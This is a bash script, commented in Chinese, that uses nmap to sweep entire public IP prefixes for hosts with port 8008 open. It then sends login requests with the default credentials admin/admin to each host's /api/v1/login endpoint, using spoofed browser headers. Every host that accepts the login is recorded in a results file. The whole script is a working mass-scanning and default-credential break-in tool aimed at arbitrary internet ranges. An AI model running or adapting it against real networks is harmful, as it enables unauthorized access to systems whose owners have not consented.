#!/usr/bin/env bash
set -euo pipefail

# combined_scan_and_check.sh
# 说明：
#  1) 顺序扫描给定的前缀（prefixes），把 nmap 提取到的 IP 逐行追加到 scan output（默认 ip_list.txt），
#     不去重、不并发（保持你之前的要求）。
#  2) 读取扫描得到的 IP 列表，对每个 IP(或 IP:PORT) 发起 curl POST 请求到 /api/v1/login，
#     替换 URL、Origin、Referer 中的 host 为当前目标的 ip:port，若响应 JSON 含有 "success": true
#     则把 ip:port 追加到 result 文件（默认 ok.txt）。
#
# 用法示例：
#   ./combined_scan_and_check.sh -f prefixes.txt -s ip_list.txt -r ok.txt -t 8
#
# 参数说明：
#  -f FILE   prefixes 文件，每行一个网段（如 149.88.64.0/20），或同时可在命令行提供前缀参数
#  -s FILE   扫描输出文件（默认 ip_list.txt），会被追加
#  -r FILE   匹配结果输出（默认 ok.txt），会被追加
#  -t SEC    curl 超时秒数（默认 10）
#  -h        帮助

PREFIX_FILE=""
PREFIXES=()
SCAN_OUT="ip_list.txt"
RESULT_OUT="ok.txt"
TIMEOUT=10

usage(){
  cat <<EOF
Usage: $0 -f prefixes_file [-s scan_out] [-r result_out] [-t curl_timeout]
  -f FILE   prefixes file (one prefix per line) or you may pass prefixes as positional args
  -s FILE   scan output file to append IPs (default: ip_list.txt)
  -r FILE   result file to append matched IP:PORT (default: ok.txt)
  -t SEC    curl max-time seconds (default: 10)
  -h        show this help

Example:
  $0 -f prefixes.txt -s ip_list.txt -r ok.txt -t 8
EOF
  exit 1
}

while getopts ":f:s:r:t:h" opt; do
  case $opt in
    f) PREFIX_FILE="$OPTARG" ;;
    s) SCAN_OUT="$OPTARG" ;;
    r) RESULT_OUT="$OPTARG" ;;
    t) TIMEOUT="$OPTARG" ;;
    h) usage ;;
    *) usage ;;
  esac
done
shift $((OPTIND-1))

# collect prefixes from file and args
if [[ -n "$PREFIX_FILE" ]]; then
  if [[ ! -f "$PREFIX_FILE" ]]; then
    echo "Prefix file not found: $PREFIX_FILE" >&2
    exit 2
  fi
  mapfile -t PREFIXES < <(grep -vE '^\s*(#|$)' "$PREFIX_FILE")
fi
if [[ $# -gt 0 ]]; then
  for p in "$@"; do PREFIXES+=("$p"); done
fi
if [[ ${#PREFIXES[@]} -eq 0 ]]; then
  echo "No prefixes provided." >&2
  usage
fi

# ensure scan output exists (append mode)
: >> "$SCAN_OUT"
: >> "$RESULT_OUT"

# Phase 1: sequential nmap scan per prefix
for prefix in "${PREFIXES[@]}"; do
  echo "Scanning ${prefix} ..."
  # run nmap and extract IPs according to your original pipeline
  # keep it simple and append directly to SCAN_OUT; tolerate failures
  nmap -p 8008 -n --open "$prefix" 2>/dev/null \
    | grep "Nmap scan report for"\
    | awk '{print $5}' \
    >> "$SCAN_OUT" || true
done

echo "Scanning finished. IPs appended to $SCAN_OUT"

# Phase 2: read scan output and perform curl checks
while IFS= read -r line || [[ -n "$line" ]]; do
  # trim
  line="${line#${line%%[![:space:]]*}}"
  line="${line%${line##*[![:space:]]}}"
  [[ -z "$line" ]] && continue
  [[ "${line:0:1}" = "#" ]] && continue

  raw="$line"
  ip="$raw"
  port=""

  if [[ "$raw" == *:* ]]; then
    ip="${raw%%:*}"
    port="${raw#*:}"
  fi

  if [[ -z "$port" ]]; then
    port=8008
  fi

  host="${ip}:${port}"
  url="http://${host}/api/v1/login"
  origin="http://${host}"
  referer="http://${host}/dashboard/login"

  printf 'Requesting %s ...\n' "$url"

  resp=$(curl -sS --max-time "$TIMEOUT" \
    -H 'Accept: */*' \
    -H 'Accept-Language: zh-CN,zh;q=0.9' \
    -H 'Cache-Control: no-cache' \
    -H 'Content-Type: application/json' \
    -H "Origin: ${origin}" \
    -H 'Pragma: no-cache' \
    -H "Referer: ${referer}" \
    -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36' \
    --data-raw '{"username":"admin","password":"admin"}' \
    --insecure "$url" 2>/dev/null) || resp=""

  if [[ -z "$resp" ]]; then
    printf '  (no response or curl failed)\n'
    continue
  fi

  # check for "success": true
  if printf '%s' "$resp" | grep -Eq '"success"[[:space:]]*:[[:space:]]*true\b'; then
    printf '%s\n' "${host}" >> "$RESULT_OUT"
    printf '  => matched, appended %s to %s\n' "${host}" "$RESULT_OUT"
  else
    printf '  => not matched\n'
  fi

done < "$SCAN_OUT"

printf 'All done. Scanned IPs in %s ; matched in %s\n' "$SCAN_OUT" "$RESULT_OUT"
